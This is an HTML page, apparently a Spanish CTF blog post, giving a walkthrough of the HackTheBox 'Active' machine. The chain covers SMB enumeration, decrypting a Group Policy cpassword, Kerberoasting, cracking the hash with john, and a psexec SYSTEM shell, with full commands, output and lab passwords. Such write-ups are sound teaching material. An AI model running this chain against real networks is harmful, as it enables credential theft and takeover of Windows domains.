@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Active</title>
+
+  <meta name="description" content="Resolución de la máquina Active de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Active">
+  <meta name="twitter:description" content="Resolución de la máquina Active de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/active.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Active">
+  <meta property="og:description" content="Resolución de la máquina Active de la plataforma de HackTheBox">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/active.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/active.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Active" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#access-svc_tgs">Access - SVC_TGS</a></li>
+        <li><a href="#shell-administrator">Shell - Administrator</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/active.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Active</h2><br>
+  </header>
+
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con nmap, donde encontramos varios puertos abiertos, entre ellos ldap, kerberos, smb, etc.</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.10.100
+Nmap scan report for 10.10.10.100  
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49157/tcp open  unknown
+49158/tcp open  unknown</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con crackmapexec a nivel de smb podemos el nombre <code class="language-plaintext highlighter-rouge">DC</code> que indica que es el Domain Controller, pero tambien encontramos el dominio de la máquina <code class="language-plaintext highlighter-rouge">active.htb</code><p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.100
+</span><span class="az">SMB         </span><span class="p">10.10.10.100  445    DC               </span><span class="az">[*] </span><span class="p">Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para que sepa a donde resolver cuando apuntemos al dominio <code class="language-plaintext highlighter-rouge">active.htb</code> lo agregaremos al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> pensando en futuros ataques que pueda haber<p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.10.10.100 active.htb" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Listando recursos compartidos en smb encontramos un directorio <code class="language-plaintext highlighter-rouge">Replication</code> que es el unico que generalmente no esta por defecto en los sistemas Windows</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ smbclient </span><span class="p">-N -L active.htb
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Replication     Disk      
+	SYSVOL          Disk      Logon server share  
+	Users           Disk      </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos conectamos al recurso Replication con smbclient donde encontramos un directorio llamado active.htb que a su vez tiene mas directorios dentro de el</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ smbclient</span><span class="p"> -N //active.htb/Replication
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Sat Jul 21 05:37:44 2018  
+  ..                                  D        0  Sat Jul 21 05:37:44 2018
+  active.htb                          D        0  Sat Jul 21 05:37:44 2018
+
+		5217023 blocks of size 4096. 242406 blocks available
+smb: \> cd active.htb
+smb: \active.htb\> dir
+  .                                   D        0  Sat Jul 21 05:37:44 2018
+  ..                                  D        0  Sat Jul 21 05:37:44 2018
+  DfsrPrivate                       DHS        0  Sat Jul 21 05:37:44 2018
+  Policies                            D        0  Sat Jul 21 05:37:44 2018
+  scripts                             D        0  Wed Jul 18 13:48:57 2018
+
+		5217023 blocks of size 4096. 241699 blocks available
+smb: \active.htb\></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después de navegar entre los directorios dentro de otros encontramos un archivo <code class="language-plaintext highlighter-rouge">Groups.xml</code> dentro de el directorio Groups dentro de varios otros</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\> dir
+  .                                   D        0  Sat Jul 21 05:37:44 2018
+  ..                                  D        0  Sat Jul 21 05:37:44 2018
+  Groups.xml                          A      533  Wed Jul 18 15:46:06 2018
+
+		5217023 blocks of size 4096. 205728 blocks available
+smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\> get Groups.xml
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml of size 533 as Groups.xml (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)  
+smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\></span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="access-svc_tgs">
+<br><h3 class="post-title">Access - SVC_TGS</h3><br>
+
+<p class="plain-text">Leyendo el archivo xml (se ha modificado la identación para hacerlo mas legible) podemos encontrar un campo <code class="language-plaintext highlighter-rouge">cpassword</code> que parece ser una cadena cifrada</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
+<span class="nt">&lt;Groups</span> <span class="na">clsid=</span><span class="s">"{3125E937-EB16-4b4c-9934-544FC6D24D26}"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;User</span> <span class="na">clsid=</span><span class="s">"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"</span> <span class="na">name=</span><span class="s">"active.htb\SVC_TGS"</span> <span class="na">image=</span><span class="s">"2"</span> <span class="na">changed=</span><span class="s">"2018-07-18 20:46:06"</span> <span class="na">uid=</span><span class="s">"{EF57DA28-5F69-4530-A59E-AAB58578219D}"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;Properties</span> <span class="na">action=</span><span class="s">"U"</span> <span class="na">newName=</span><span class="s">""</span> <span class="na">fullName=</span><span class="s">""</span> <span class="na">description=</span><span class="s">""</span> <span class="na">cpassword=</span><span class="s">"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</span> <span class="na">changeLogon=</span><span class="s">"0"</span> <span class="na">noChange=</span><span class="s">"1"</span> <span class="na">neverExpires=</span><span class="s">"1"</span> <span class="nt">&gt;</span>  
+  <span class="nt">&lt;/User&gt;</span>
+<span class="nt">&lt;/Groups&gt;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos decifrarlo con <code class="language-plaintext highlighter-rouge">gpg-decrypt</code> y obtenemos lo que parece ser una contraseña probablemente para el usuario <code class="language-plaintext highlighter-rouge">SVC_TGS</code> que también podemos ver en el xml</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ gpp-decrypt </span><span class="p">edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ  
+GPPstillStandingStrong2k18</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al comprobarla con crackmapexec podemos ver que es válida y listando los recursos compartidos tenemos permiso de lectura en el recurso compartido <code class="language-plaintext highlighter-rouge">Users</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18 --shares
+</span><span class="az">SMB         </span><span class="p">10.10.10.100  445    DC               </span><span class="az">[*] </span><span class="p">Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">10.10.10.100  445    DC               </span><span class="ve">[+] </span><span class="p">active.htb\SVC_TGS:GPPstillStandingStrong2k18 
+</span><span class="az">SMB         </span><span class="p">10.10.10.100  445    DC               </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">10.10.10.100  445    DC               </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">10.10.10.100  445    DC               </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">10.10.10.100  445    DC               </span><span class="am">ADMIN$                          Remote Admin
+</span><span class="az">SMB         </span><span class="p">10.10.10.100  445    DC               </span><span class="am">C$                              Default share
+</span><span class="az">SMB         </span><span class="p">10.10.10.100  445    DC               </span><span class="am">IPC$                            Remote IPC
+</span><span class="az">SMB         </span><span class="p">10.10.10.100  445    DC               </span><span class="am">NETLOGON        READ            Logon server share 
+</span><span class="az">SMB         </span><span class="p">10.10.10.100  445    DC               </span><span class="am">Replication     READ            
+</span><span class="az">SMB         </span><span class="p">10.10.10.100  445    DC               </span><span class="am">SYSVOL          READ            Logon server share 
+</span><span class="az">SMB         </span><span class="p">10.10.10.100  445    DC               </span><span class="am">Users           READ</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entramos proporcionando las credenciales que tenemos y podemos ver directorios de usuarios de la máquina entre ellos el directorio de SVC_TGS que somos nosotros</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ smbclient</span><span class="p"> //active.htb/Users -U SVC_TGS%GPPstillStandingStrong2k18
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                  DR        0  Sat Jul 21 09:39:20 2018  
+  ..                                 DR        0  Sat Jul 21 09:39:20 2018
+  Administrator                       D        0  Mon Jul 16 05:14:21 2018
+  All Users                       DHSrn        0  Tue Jul 14 00:06:44 2009
+  Default                           DHR        0  Tue Jul 14 01:38:21 2009
+  Default User                    DHSrn        0  Tue Jul 14 00:06:44 2009
+  desktop.ini                       AHS      174  Mon Jul 13 23:57:55 2009
+  Public                             DR        0  Mon Jul 13 23:57:55 2009
+  SVC_TGS                             D        0  Sat Jul 21 10:16:32 2018
+
+		5217023 blocks of size 4096. 298429 blocks available
+smb: \></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos entrar en el escritorio del usuario SVC_TGS donde encontramos la primera flag asi que la descargamos usando el comando get y la leemos en local</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">smb: \> cd SVC_TGS\Desktop
+smb: \SVC_TGS\Desktop\> dir
+  .                                   D        0  Sat Jul 21 10:14:42 2018  
+  ..                                  D        0  Sat Jul 21 10:14:42 2018
+  user.txt                           AR       34  Fri Feb 10 01:19:19 2023
+
+		5217023 blocks of size 4096. 296337 blocks available
+smb: \SVC_TGS\Desktop\> get user.txt
+getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0 KiloBytes/sec)  
+smb: \SVC_TGS\Desktop\> exit
+
+</span><span class="ve">❯ cat </span><span class="p">user.txt
+744**************************e3e</span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<p class="plain-text">Analizemos, el usuario es SVC_TGS, <code class="language-plaintext highlighter-rouge">TGS</code> es el nombre del hash que se obtiene al realizar un <code class="language-plaintext highlighter-rouge">Kerberoasting Attack</code> que se realiza cuando tienes credenciales validas (que las tenemos), con <code class="language-plaintext highlighter-rouge">impacket-GetUserSPNs</code> podemos probar el Kerberoasting</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-GetUserSPNs</span><span class="p"> -request active.htb/SVC_TGS:GPPstillStandingStrong2k18
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2023-03-16 17:00:58.625320             
+
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$09a952cad825a6d241760e649cfb414b$503a6f0d949c2a01ea1e56871e7f04c26396dface190fcd516a7eccac11a0bc060e2081fff28ab1e30e7545fb38cef7aadf404f061d7df0b58f5e506e5d9f89cedc897db8daa61793fb0b39497cfef978274dbf50137d134be4a561f972da470f7d2ebe4a5fe5c37a02b718b438e8dc14bfa39765b0f3a157728d1e3aace87983e5e09ea248e9f2f105f452ebb3f6de267701265c572712612a841f1b5c2034aba40e37e3960c442f1d5172b82515668c4eba6e19b5b195e8d8884d0901d89f9e8c9726eb3c1838980d4697fb7a48dc623e8eceff556595f161d30d87265164fe104ddf10e6169752e5f987b2de243ecab93091bba8fbd86166e8727159d199429e79490113abdd3bee976d62f3da2c54c1aac61c91a201be97af74d0681d475380ef706a7b8e0cf5e7af0df79813d8fc91e4f5c296cce933d97df8d3229de7ec5e856b8f28db8a07a1122932df83cc6b197842145dfe5e3d8addce35b571a6a0edd35d155486302face24bcff9b011c2c84c374d918d573b0b39e65d037aebcb01c1c8811620fab84f27f223dfc9f179964a4e153d5f2e989de225af17a4cfc33b6b95ac7b19b314462399a25653fc45bb6f096fc304c1872ebcb7c4f01d1c1491799aa1aeecb3990b20ecdf8a2f0b09b5a436daa10774f86dbaa24f0baf9652b499d5a8c10dfd5c279d2d9550131b755f5db0da4d56454c6dade09e90ba7c121105c5ad22fb46063cf2060183d85212d5f01a207146efaa59620149e119e27147b04a6cb51ea557d76a107960354a5641a4ff67843704bd00028dfb0fad2a427eb84361bbcccfb3093f90179ce2e3903b97439d3d270a617acbfb40c0166c8a97eb07715587b1be0ab95a624f4a81eefebd4ae1d7528a7c969b91338a6dc560e5bff96475ea0b9e1977d8522d52d3c35b2b3c074c8359ddb8243160b1ac0fdfc446857a2e58b9c253eccccebb0511d7cfccb1dafa6b527afdbe8a1518f561f6ecc6c0cf565e1e8506d9ca3ff1258a8c2bcc8dc3d200904a90d81623ebee31bb5dcd6be9780a31e2c3bb5abc7c7808b5b3d5237baae18b9b915caa04b05e55953be5a0d55447ee0e8580984b1e4c34e9556dd3a88e040dd243dcb094610db1716c77c59c1b0cc9a363ccd5c186076447831b2fbf5522cced9a7a8dffc811f6e3c9e2bba7a6f6fa4bdf75c03aae92b884a8b6cac6e1ef6e0a7e5a101d6c9303ead1a72411161c7d358eaa090d4cb226e23b39416a1a5d759314d  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Obtuvimos un hash de <code class="language-plaintext highlighter-rouge">Administrator</code>, con john aplicando fuerza bruta con el rockyou.txt, conseguimos su contraseña en texto claro <code class="language-plaintext highlighter-rouge">Ticketmaster1968</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])  
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">Ticketmaster1968</span><span class="p"> (</span><span class="am">?</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos comprobarlos con crackmapexec, y nos devuelve que son válidas y como es el usuario Administrator también devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code> tenemos privilegios máximos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.100 -u Administrator -p Ticketmaster1968
+</span><span class="az">SMB         </span><span class="p">10.10.10.100  445    DC               </span><span class="az">[*] </span><span class="p">Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">10.10.10.100  445    DC               </span><span class="ve">[+] </span><span class="p">active.htb\Administrator:Ticketmaster1968 </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos conectamos con <code class="language-plaintext highlighter-rouge">psexec</code> de impacket y como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> obtenemos una cmd ahora tenemos privilegios para poder leer la flag de root</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-psexec </span><span class="p">WORKGROUP/Administrator:Ticketmaster1968@active.htb  
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on active.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file EyxmRtlA.exe
+[*] Opening SVCManager on active.htb.....
+[*] Creating service bBra on active.htb.....
+[*] Starting service bBra.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32></span><span class="am">whoami</span><span class="p">
+nt authority\system
+
+C:\Windows\system32></span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
+457**************************19b
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
